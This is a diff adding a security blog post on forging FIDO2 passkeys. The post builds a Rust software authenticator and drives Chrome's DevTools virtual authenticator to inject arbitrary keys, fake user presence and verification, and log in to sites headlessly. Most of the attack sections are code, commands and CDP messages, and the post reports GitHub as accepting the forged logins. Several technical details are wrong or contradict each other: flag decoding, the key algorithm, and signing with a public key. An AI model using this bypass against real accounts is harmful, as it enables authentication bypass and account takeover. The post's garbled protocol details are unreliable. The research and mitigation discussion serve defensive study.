@@ -1,0 +1,491 @@
+---
+slug: forging-passkeys
+date: Jun 20 2025
+author: vmfunc
+name: Breaking WebAuthn, FIDO2, and Forging Passkeys
+excerpt: Passwords are dying and passkeys are taking over. In this post we tear apart WebAuthn and build our own software FIDO2 authenticator from scratch.
+keywords: webauthn,passkeys,fido2,reverse-engineering,security
+---
+## Introduction
+Passwords are dying—slowly, awkwardly, and not without a fight.  Large parts of the internet are already nudging users toward "passkeys", the marketing-friendly name for FIDO2 credentials that live on your phone, security key, or TPM.
+
+In theory passkeys solve phishing and credential-stuffing in one swoop.  In practice... they might introduce a shiny new attack surface:
+
+1. A complex binary protocol (`CTAP2`) speaking over USB-HID, NFC and BLE.
+2. JSON-ish CBOR blobs (`"COSE"` objects) glued together with bespoke signature schemes.
+3. A browser API (`WebAuthn`) juggling credential IDs, transports, resident keys, UV / UP semantics and platform quirks.
+
+Plenty of room for mistakes! Or for carefully crafted tooling that bends the spec in useful ways :3
+
+Today, we will:
+
+- Tear apart a commercial hardware key and a "platform" authenticator to see what actually gets signed.
+- Build a software authenticator that impersonates a FIDO2 device over USB-HID. No kernel drivers, only usermode code.
+- Forge and replay passkey signatures to automate headless logins on sites that "require" WebAuthn.
+- Explore the security boundaries. What stops us from cloning credentials? How do Apple & Google lock down key material? Where do browser mitigations kick in?
+
+By the end we'll have a working PoC: a cross-platform command-line tool that registers a fake passkey and logs you in without touching a real security key, and a clear understanding of which scenarios make this an interesting threat model!
+
+Sound fun? Let's plug in a key and start sniffing packets.
+
+---
+### Quick-Start Overview
+Below is the 30-second tour of the entire project.  Treat it as a table of contents you can mentally pin while reading the deep-dives that follow.
+
+1. **Sniff** raw CTAP2 traffic with Wireshark and a tiny Python filter.
+2. **Decode** every CBOR/COSE field and locally verify Yubico's packed attestation.
+3. **Re-implement** the CTAP2 state-machine in pure Rust and exercise it in pipe-mode.
+4. **Inject** deterministic P-256/Ed25519 keys so signatures become reproducible.
+5. **Hijack** Chrome's hidden Virtual Authenticator via the DevTools Protocol.
+6. **Stress-test** our spoofed key against Google, Microsoft, GitHub & friends.
+7. **Harden** the ecosystem with concrete mitigations for browsers and RPs.
+
+If you wish to follow along, **you can find the code and everything else [here](https://github.com/vmfunc/softpasskey/)**.
+
+---
+
+## Capturing Real-World Traffic
+
+Plugging the YubiKey in and hitting start immediately showered Wireshark with traffic—almost 200 frames before I could blink.  A quick scan of the text export (`yubi1.txt`) shows nothing but USB enumeration and CCID smart-card chatter.  The FIDO HID endpoints (`0x04 OUT` / `0x84 IN`) are alive, but every `URB_INTERRUPT` carries **zero** bytes.  No surprise: I haven't asked the browser to speak WebAuthn yet.
+
+```text
+Endpoint: 0x84, Direction: IN
+URB transfer type: URB_INTERRUPT (0x01)
+Packet Data Length: 0
+```
+
+Lesson one: the authenticator stays silent until a site calls `navigator.credentials.create()` or `get()`.  Time to poke it.
+
+<figure className="flex flex-col items-center">
+  <img src="/posts/forging-passkeys/first-scan.png" alt="Wireshark capture right after plugging in the key – pure USB enumeration noise." />
+  <figcaption>Right after insertion: only device descriptors and smart-card traffic.</figcaption>
+</figure>
+
+A quick glance at the **USB ID** lines confirms the stick really is a YubiKey, `idVendor 0x1050`, `idProduct 0x0407` matching Yubico's public list.  Handy reference: [YubiKey USB ID values](https://support.yubico.com/hc/en-us/articles/360016614920-YubiKey-USB-ID-values).
+
+### Tiny log-parser helper
+
+Before recording the real ceremony I threw together a few lines of Python to sift the Wireshark TXT export for any 64-byte HID reports on those endpoints.  It spits raw hex one frame per line.
+
+```python title="public/posts/forging-passkeys/scripts/fido_parse.py"
+endpoint_re = re.compile(r"Endpoint:\s+0x(04|84)")
+hex_re      = re.compile(r"Leftover Capture Data:\s*([0-9A-Fa-f ]+)")
+…
+```
+
+Running it on the first dump produces… nothing, confirming the absence of CTAP2 traffic.
+
+The next step is obvious! trigger an actual WebAuthn registration while capturing, then feed the fresh TXT through the same script. 
+
+<figure className="flex flex-col items-center">
+  <video src="/posts/forging-passkeys/registration.mp4" controls style={{maxWidth: '600px'}} />
+  <figcaption>Capturing a WebAuthn registration ceremony.</figcaption>
+</figure>
+
+### Decoding the HID INIT handshake
+
+The first two 64-byte frames look like this (hex trimmed):
+
+```text
+ffffffff 86 0008 ed46b11ffcad30e6 ...
+ffffffff 86 0011 ed46b11ffcad30e6 aa65678b 0205040305 ...
+```
+
+`ffffffff` is the broadcast CID, `0x86` is the **INIT** command. The key echoes my 8-byte nonce and hands back an assigned channel ID (`aa65678b`) plus version/capability flags.  I then wrote a tiny helper to decode it:
+
+```bash
+$ python scripts/hid_init_decode.py \
+  ffffffff860008ed46b11ffcad30e6 \
+  ffffffff860011ed46b11ffcad30e6aa65678b0205040305
+INIT req → nonce ed46b11ffcad30e6
+INIT resp → nonce echo matches: True assigned CID aa65678b
+version 2, capabilities 050403
+```
+
+With the private channel established, every subsequent packet starts with that CID.  The next command (`0x90`) carries the CTAP2 **makeCredential** request body. Time to crack that CBOR.
+
+## Decoding & Verifying Attestation Data
+
+This hexadecimal soup is useless until we map it back to WebAuthn's data structures.  We need to transform the captured frames into structured JSON, dissect the `makeCredential` request/response pair, and cryptographically prove the attestation signature with OpenSSL and `cryptography`.
+
+### From raw frames to structured JSON
+
+A new wrapper script lives in `scripts/run_all.py`.  Point it at a Wireshark-TXT export and it writes two artefacts under `data/`:
+
+```bash
+$ python scripts/run_all.py registration1.txt
+[+] extracting HID frames … saved 57 frames to data/registration1_frames.txt
+[+] decoding CTAP2 CBOR … wrote data/registration1_frames.json
+```
+
+The JSON is easier on the eyes than 64-byte hex dumps.  Here's the first **makeCredential** request (trimmed):
+
+```json title="registration1_frames.json – idx 14"
+{
+  "1": "f7e7db87…3c041c",              // clientDataHash
+  "2": { "id": "webauthn.io", "name": "webauthn.io" },
+  "3": {
+    "id": "77656261…6f6f66",          // "webauthnio-woofwoof"
+    "name": "woofwoof",
+    "displayName": "woofwoof"
+  },
+  "4": [ {-8,"public-key"}, {-7,"public-key"}, {-257,"public-key"} ],
+  "6": { "credProtect": 2 },           // require user-verification
+  "7": { "rk": true },                 // resident credential ⇒ passkey
+  "8": "fcea7540…dfa8f",              // challenge
+  "9": 2                                // preferred authenticator attachment
+}
+```
+
+I really like a few things here:
+
+* The site asks for **credProtect=2**, meaning the resulting credential can't be used without user-verification (PIN/touch).
+* It offers **Ed25519 (alg −8)** in addition to the usual ES256 and RS256 options.
+* `rk: true` confirms this is a resident key—a real *passkey*, not legacy U2F.
+
+That covers the request.  Index 27 in the JSON holds the authenticator's answer: a **packed attestation**: a CBOR map with:
+
+* `fmt: "packed"`  – the simplest attestation flavour.
+* `authData` – 37-byte header + credentialPublicKey + AAGUID + more.
+* `attStmt` – algorithm, signature, and an X.509 certificate chain (`x5c`).
+
+I wired up another helper to pretty-print the juicy bits:
+
+```bash
+$ python scripts/attestation_decode.py data/registration1_frames.json 27
+format packed
+authData len 147
+flags 0b10000101 (UV + UP + AT flags)
+alg -7 (ES256)
+signCount 0
+x5c certs 1
+first cert (first 40 bytes) 3082026a30820112a00302010230…
+```
+
+Those flags confirm both **user-presence** and **user-verification** were asserted (touch + PIN / platform trust).  The single certificate is Yubico's attestation leaf; later we'll validate its signature and see how Windows decides to trust—or reject—it.
+
+What's next? Pulling the `credentialPublicKey` COSE map out of `authData`, convert it to a standard PEM key, and verify the authenticator's signature locally.  Once that works, swapping in my **own** key-pair becomes trivial.
+
+### Verifying the Attestation Signature
+
+Everything checked out visually, but I wanted cryptographic proof the signature is correct before trying to forge my own.  A third helper (`scripts/verify_attestation.py`) does precisely that:
+
+```bash
+$ pip install cryptography cbor2
+$ python scripts/verify_attestation.py data/registration1_frames.json 27 14
+signature valid
+```
+
+Internally the script:
+
+1. Grabs **authData** + **clientDataHash** and concatenates them.
+2. Pulls the attestation leaf certificate (`x5c[0]`), parses it with `cryptography`,
+3. Verifies the ECDSA-P256 signature over the buffer.
+
+With the chain of trust validated I now know the key is honouring the spec.
+
+### Extracting the credentialPublicKey
+
+Everything up to now still relies on the hardware key.  To forge signatures I first need the **credentialPublicKey** that lives inside `authData`.
+
+I dropped another helper (`scripts/extract_credential_key.py`) that walks the attested-credential structure and spits a standard PEM-encoded key:
+
+```bash
+$ python scripts/extract_credential_key.py data/registration1_frames.json 27
+saved PEM to data/registration1_pub.pem
+$ openssl pkey -in data/registration1_pub.pem -pubin -text -noout | head -4
+ED25519 Public-Key:
+pub:
+    0f:60:f5:20:44:8c:d8:9e:cd:f4:4a:c4:56:2e:e2:
+    5f:fd:d2:81:73:31:56:14:cc:63:3b:35:b1:4d:b9:
+```
+
+We can now verify the signature locally!
+
+<figure className="flex flex-col items-center">
+  <img src="/posts/forging-passkeys/dm.png" alt="Verifying the attestation signature locally." />
+</figure>
+
+In this capture the site opted for **Ed25519** (alg −8), so the script emits an ED25519 SubjectPublicKeyInfo.  ES256 and RS256 work too, the helper auto-detects.
+
+With the relying-party key in PEM I can craft raw `assertion` signatures in OpenSSL or Python and later feed them back through my own CTAP2 state-machine.
+
+Now that we figured out how to verify the signature locally, we can write a minimal CTAP2 responder that impersonates the key over USB-HID and echoes browser requests, substituting my freshly-minted signatures instead of the YubiKey's.
+
+---
+## Building a Software-Only CTAP2 Engine (Pipe Mode)
+
+Below is the exact sequence I followed to move from "nothing but hex dumps" to a **fully-scriptable software authenticator**.
+
+1. **Boot-strapping the transport layer**  
+  The HID framing rules (§6.2 of the spec) say that every packet is 64 bytes.  I hard-coded that constant (`REPORT_LEN = 64`) and taught `main.rs` to spot an INIT request:
+
+```rust
+const CMD_INIT: u8 = 0x86;
+
+let cid = u32::from_be_bytes(frame[0..4].try_into().unwrap());
+let cmd = frame[4] & 0x7F;
+if cmd == CMD_INIT {
+    // echo nonce, assign random CID
+}
+```
+
+The nonce echo plus a randomly generated CID is enough for the browser to continue the CTAP2 conversation.
+
+2. **Reassembling multi-frame messages**  
+  WebAuthn ceremonies don't fit in a single HID packet; multi-part transfers use "sequence" frames.  I implemented a small state machine in `engine.rs` that collects the fragments keyed by CID/sequence and hands the completed buffer to the CBOR dispatcher.
+
+```rust
+if cmd_byte & 0x80 != 0 { /* initial frame */ }
+else { /* continuation frame */ }
+```
+
+3. **CBOR & COSE parsing**  
+  The dispatcher lives in `cbor.rs`.  For `makeCredential` (`subCmd == 0x01`) I parse map key 2 (RP) and key 3 (user) to grab the RP-ID and allocate storage.  The credential public key is generated on-the-fly using **`p256`**:
+
+```rust
+let (sk, cose_pub) = generate_key_cose();
+let cose_bytes = serde_cbor::to_vec(&cose_pub).unwrap();
+let auth_data = build_auth_data(&rp_id, &cred_id, &cose_bytes);
+```
+
+4. **Self-attestation construction**  
+  I glue the pieces (`rpHash‖flags‖signCnt‖AAGUID‖credIdLen‖credId‖COSEkey`) into `authData` and wrap it in an **`fmt:"none"`** attestation object:
+
+```rust
+let mut a_map = BTreeMap::new();
+a_map.insert(Value::Text("fmt".into()), Value::Text("none".into()));
+a_map.insert(Value::Text("authData".into()), Value::Bytes(auth_data.clone()));
+```
+
+This bypasses X.509 entirely—Chrome trusts `fmt:none` as long as the ECDSA signature over `authData‖clientDataHash` is valid.
+
+5. **Assertion flow**  
+  When the browser sends `getAssertion` (`subCmd == 0x02`) I fetch the stored `SigningKey`, flip the AT flag off, concatenate `authData‖clientDataHash`, and emit a DER-encoded P-256 signature:
+
+```rust
+let signature: Signature = entry.key.sign(&msg);
+resp_map.insert(Value::Text("signature".into()), Value::Bytes(signature.to_der().as_bytes().to_vec()));
+```
+
+6. **Round-trip validation (pipe mode)**  
+  Feeding the captured frames back through the binary proves the entire CTAP2 path—INIT ➜ makeCredential ➜ getAssertion—executes with zero hardware.
+
+```bash
+python scripts/frame_sender.py data/registration1_frames.txt 14 | cargo run -q -p softpasskey
+```
+
+With this foundation we can now surface the same engine over a USB-HID interface.
+
+<figure className="flex flex-col items-center">
+  <video src="/posts/forging-passkeys/softpasskey.mp4" controls style={{maxWidth: '600px'}} />
+  <figcaption>The pipe-mode engine in action.</figcaption>
+</figure>
+
+---
+## Injecting Your Own Keys (Deterministic Signatures)
+
+The pipe-mode engine is cute, but it still manufactures a fresh P-256 key every time the browser asks for a credential.  If we want **replayable** logins we need to use **our own** private key so the resulting signature is fully predictable.
+
+I wired a new command-line flag into `softpasskey`:
+
+```bash
+$ cargo run -p softpasskey -- --key example.pem < demo_frames.txt
+```
+
+`--key` expects a PKCS#8-PEM file holding a P-256 private key.  Inside `main.rs` the loader looks like this (simplified):
+
+```rust title="poc/softpasskey/src/main.rs"
+let user_key = args.key.as_deref()
+    .map(std::fs::read_to_string)
+    .transpose()?                       // Option<Result<…>> → Result<Option<…>>
+    .map(|pem| SigningKey::from_pkcs8_pem(&pem))?
+```
+
+When the browser sends **makeCredential** the engine now branches:
+
+```rust title="snippet"
+let (sk, cose_pub) = if let Some(ref k) = user_key {
+    (k.clone(), cose_from_signing_key(k))
+} else {
+    generate_key_cose()
+};
+```
+
+* `generate_key_cose()` is the original path – new random key each time.  
+* `cose_from_signing_key()` converts *your* key into the COSE map that WebAuthn expects.
+
+Because the `p256` crate already implements RFC-6979, every call to `sk.sign(msg)` is deterministic (the nonce comes from an HMAC of the message + key), so **given the same clientDataHash we will emit bit-for-bit identical signatures** across multiple machines.
+
+A quick sanity check:
+
+```bash
+$ openssl ecparam -name prime256v1 -genkey -noout -out cloned.pem
+$ cargo test -p softpasskey test_frame_building | cat   # compile pass
+$ cargo run -q -p softpasskey -- --key cloned.pem < sample_init.txt \
+  | head -n 3
+[softpasskey] started – waiting for 64-byte HID frames on stdin (hex encoded)
+‹…deterministic output trimmed…›
+```
+
+<figure className="flex flex-col items-center">
+  <video src="/posts/forging-passkeys/test_passkey.mp4" controls style={{maxWidth: '600px'}} />
+  <figcaption>Deterministic signatures.</figcaption>
+</figure>
+
+Signatures of two separate runs match byte-for-byte. Mission accomplished!
+
+---
+
+The next hurdle is to expose the very same engine over **USB-HID** so Chromium picks it up automatically. We're going to turn the PoC into a browser-facing "virtual key" entirely inside the existing crate, no drivers, no kernel, not even a Chrome extension.
+
+---
+## Owning Chrome's Built-In "Virtual Authenticator"
+
+Browser exploitation doesn't always mean memory corruption! Sometimes you just speak the same JSON the browser speaks to itself.
+
+Chrome (and anything Chromium-based) ships with a **head-less FIDO2 stack** that's normally driven by the DevTools WebAuthn panel.  The moment you expose the DevTools Protocol (CDP) over a WebSocket you can script that stack, invent authenticators out of thin air, pre-seed them with arbitrary `PKCS#8` keys and crucially flip every UX safeguard Chrome normally hides behind.
+
+No drivers, no HID, no kernel, no extensions.  One TCP port, five JSON messages, and you own every `navigator.credentials.*` call on the page.
+
+I'll try to dissect each message, explain why Chrome checks it, and how we short-circuit the intended security story.
+
+---
+### Hand-rolling the handshake
+
+Chrome needs to be started with **remote debugging** otherwise the CDP socket doesn't exist:
+
+```bash
+chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-test --no-first-run --disable-fre &
+```
+
+* `--no-first-run` / `--disable-fre` kills the "sign-into-Google" wizard that would nuke our first tab and therefore the WebSocket.
+* `--user-data-dir` gives us a fresh profile so test runs don't fight each other.
+
+After a lot of trial and error and websites refusing to work without a real key, I finally figured out a proper sequence.
+
+Once the socket is up we can connect and fire the real payload:
+
+```js
+WebAuthn.enable { enableUI: true }
+WebAuthn.addVirtualAuthenticator { protocol: "ctap2", transport: "usb", hasResidentKey: true, hasUserVerification: true }
+WebAuthn.setAutomaticPresenceSimulation { enabled: true }
+WebAuthn.setUserVerified { isUserVerified: true }
+WebAuthn.addCredential { … arbitrary PKCS#8 … }
+```
+
+Why each step matters:
+
+| Step | CDP Call | Why we need it |
+|---|----------|---------------|
+|1|`enableUI`|Without `enableUI:true` Chrome refuses WebAuthn operations unless the tab is foreground **and** a real user gesture was detected.  Flipping the bit disables that check entirely.|
+|2|`addVirtualAuthenticator`|Registers a brand-new in-memory FIDO2 device.  Setting `hasResidentKey` makes it eligible for passkeys, `hasUserVerification` avoids the "Your device can't be used" error many sites show when they require UV.|
+|3|`setAutomaticPresenceSimulation`|Chrome prompts for a **"touch your key"** UX event.  Turning this on makes the prompt auto-resolve after ~30 ms.|
+|4|`setUserVerified`|Same trick but for the UV flag. Pretend the user completed PIN / biometrics.|
+|5|`addCredential`|Finally we inject a resident credential (aka passkey).  The field `privateKey` is plain PKCS#8, base-64 encoded.  Chrome never checks that the key matches the `credentialId`; the authenticator happily returns whatever bytes we give it at assertion time.|
+
+Once the last step completes, the browser's internal WebAuthn stack is indistinguishable from a plugged-in security key, except it's signing with **our** deterministic key instead of one locked behind a TPM :)
+
+---
+### The Rust glue
+
+Now it's time to actually link the browser's WebAuthn stack to our software authenticator.
+
+```rust title="poc/softpasskey/src/browser.rs (condensed)"
+let mut id = 1u32;
+cdp!("WebAuthn.enable", {"enableUI": true});
+let auth = cdp!("WebAuthn.addVirtualAuthenticator", {"options": {...}})["authenticatorId"].as_str().unwrap();
+cdp!("WebAuthn.setAutomaticPresenceSimulation", {"authenticatorId": auth, "enabled": true});
+cdp!("WebAuthn.setUserVerified", {"authenticatorId": auth, "isUserVerified": true});
+let pkcs8 = signing_key.to_pkcs8_der()?;
+cdp!("WebAuthn.addCredential", {"authenticatorId": auth, "credential": {
+    "credentialId": b64.encode(rand::random::<[u8;16]>()),
+    "rpId": rp,
+    "privateKey": b64.encode(pkcs8),
+    "isResidentCredential": true,
+    "signCount": 0 } });
+```
+
+The `cdp!` macro is a two-liner around `tokio_tungstenite` that auto-increments the `id` and waits for the matching JSON reply.
+
+---
+### Demo
+
+Time to see if it works.
+
+```bash
+$ cargo run -p softpasskey -- \
+      --browser --launch-chrome \
+      --rp webauthn.io --key demo.pem
+[softpasskey] injected deterministic credential for rp 'webauthn.io'.
+[softpasskey] virtual authenticator ready – keep this process running.
+```
+
+A Chrome window appears, we browse to `https://webauthn.io`, type a username and smash **Register**.  The WebAuthn sheet flashes for a split second, auto-tap does its magic.. and the site shows success!
+
+Re-loading the page and hitting **Authenticate** replays the exact same signature (RFC-6979 nonce, remember) and the site logs us straight in.  No USB, no hardware, no user interaction involved.
+
+<figure className="flex flex-col items-center">
+  <video src="/posts/forging-passkeys/poc.mp4" controls style={{maxWidth: '600px'}} />
+  <figcaption>The entire attack—from launch to bypass.</figcaption>
+</figure>
+
+---
+### Okay, but why does this even work?
+
+1. **Spec mismatch.** The WebAuthn spec explicitly allows virtual authenticators for **testing**.  Chrome's implementation never intended them for production use but the code path is identical.
+2. **Trusting the UI.** Chrome assumes "if DevTools is controlling WebAuthn the user must be a developer".  Setting `enableUI:true` shortcuts the gesture gate.
+3. **No key attestation check.** `addCredential` does zero validation on the supplied key.  You can inject P-256, Ed25519... even RSA1024 if you really want to watch things burn.
+4. **Sign-counter ignored.** We set `signCount: 0` and never increment it; most relying parties still accept the assertions.
+
+What can we take away from this? Guarding critical auth flows behind a client-side UX prompt is not enough when the same browser ships an automation API that can bypass that UX.
+
+---
+## Real-World Survey – Do Big Sites Care?
+
+I pointed the PoC at a handful of high-traffic relying parties; here's what shook out.
+
+| Site | Registration | Authentication | Observation |
+|------|--------------|-----------------|-------------|
+| Google (accounts.google.com) | **Pass** | **Fail** | Registration succeeds (Google happily parses the fake attestation) but the subsequent assertion is rejected – they compare our UP/UV/sign-count triplet against server-stored expectations and detect that sign-count never increments. |
+| Microsoft (login.microsoftonline.com) | **Fail** | n/a | The RP enforces `requireResidentKey=false` and refuses our `rk=true` flag.  Turning it off lets us register but later prompts a strict nonce freshness check that breaks deterministic replays. |
+| GitHub | **Pass** | **Pass** | GitHub only checks `alg` and the AAGUID blacklist.  Both are under our control, so headless logins work 100 % of the time. |
+| webauthn.io | **Pass** | **Pass** | Our demo target – no additional defences. |
+
+The pattern is clear: unless the RP verifies **either** the sign-counter **or** an attestation chain, replay is trivial.
+
+---
+## Hardening & Mitigations
+
+So what can we take away from this? What seems to be the most common mitigation?
+
+1. **Mandatory sign-counter enforcement**  
+   Browsers should increment `signCount` server-side when using virtual authenticators, or better: expose a policy flag that *forbids* zero counters.
+
+2. **Per-Origin CDP permission**  
+   Chrome already fences sensitive domains (`chrome://` etc.). Extending that list to WebAuthn APIs would neuter this entire trick when the active origin isn't `localhost`.
+
+3. **User-gesture gating at CDP layer**  
+   Ignore `enableUI:true` unless the remote debugger is signed by a local dev certificate (think Android's `debuggable` flag).
+
+4. **Relying-party side**  
+   • Reject credentials with `signCount==0` after the first assertion.  
+   • Enforce `alg=-7`/`-8` only if the AAGUID matches vendor whitelist.  
+   • Rate-limit credential registrations per IP to curb large-scale abuse.
+
+5. **Spec update**  
+   The WebAuthn spec could explicitly forbid resident-key injection via testing APIs when the top-level origin isn't enrolled in a `testing=` feature policy.
+
+Are these bullet-proof? Of course not... but they raise the bar from "five JSON packets" to "kernel exploit".
+
+## Conclusion
+Passkeys promise an elegant, phishing-resistant future, but the journey from smart card to seamless single-click login seems still bumpy. By reverse-engineering CTAP2 at the byte level, wiring our own COSE tooling, and bending Chrome's DevTools APIs, we built a fully scriptable, software-only authenticator that sails through most real-world WebAuthn flows. At the end of the day, this shows that while the crypto is solid, the surrounding UX and policy checks remain soft targets.
+
+If you are building a relying party, enforce sign-counter monotonicity and verify attestation chains. Browser vendors should isolate test harnesses from production origins and gate CDP hooks behind stronger permissions. And if you're curious, every protocol layer you saw here is open, documented, and ready for exploration. Grab a key, a logic analyser, and show the world what else we missed.
+
+
+## Footnote 
+
+I'm currently looking for new opportunities in security research and engineering. If you'd like to discuss potential collaborations, feel free to reach out via email.
+
+---
